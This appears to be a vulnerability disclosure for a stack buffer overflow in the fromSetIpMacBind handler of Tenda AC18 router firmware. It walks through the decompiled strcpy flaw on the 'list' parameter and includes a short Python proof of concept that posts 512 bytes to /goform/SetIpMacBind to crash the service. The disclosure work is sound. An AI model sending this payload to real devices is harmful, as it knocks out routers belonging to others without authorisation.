# Sorry, the vulnerability function is FromSetIpMacBind. The submitted vulnerability description is slightly wrong. The following description shall prevail.

# Tenda AC18 V15.03.05.19 (6318) firmware has a buffer overflow vulnerability through the "fromSetIpMacBind" function.


 Vulnerability description:
 
The "FromSetIpMacBind" function of Tenda router (tendaAc18V15030519(6318)) has a high-risk stack buffer overflow vulnerability. The vulnerability is caused by the program using "Strcpy" to copy the user-controllable "List" parameter to a fixed stack buffer.

`v22 = (char *)sub_2BA8C(a1, (int)"list", (int)&unk_EE1C8);` The program gets the parameter value named **`list`** from the HTTP request and assigns its pointer to `v22`. This `v22` is an input completely controlled by the user (attacker). `v18 = strchr(src, 10);` The program attempts to split multiple entries by looking for a newline character (ASCII 10) in the input string. **Key vulnerability point** `strcpy(dest, src);` This is the core of the vulnerability outbreak. `dest` is a fixed-length buffer opened on the **Stack**, and the length of `src` (that is, the content of the `list` parameter) is uncontrollable.

<img width="1625" height="774" alt="image" src="https://github.com/user-attachments/assets/3ed962cd-4262-4108-9967-5b5234ee8ab3" />


exp:

```
import requests

def test_ac18_overflow(url):
    payload = b'A' * 512 
    
    params = {
        'bindnum': '1',
        'list': payload 
    }
    cookie = {'password': 'your_password'} 
    
    try:
        response = requests.post(url, cookies=cookie, data=params, timeout=5)
        print("Status:", response.status_code)
    except requests.exceptions.ConnectionError:
        print("Target crashed! (Potential vulnerability confirmed)")

url = "http://192.168.0.3/goform/SetIpMacBind"
test_ac18_overflow(url)
```

After the Python script sends 512 'A's, `strcpy` fills the `dest` buffer with these 'A's and continues to flood out. Cause the service to crash.
<img width="2122" height="875" alt="image" src="https://github.com/user-attachments/assets/63b9d635-98b7-48b4-a4a8-cc70d1bb8105" />










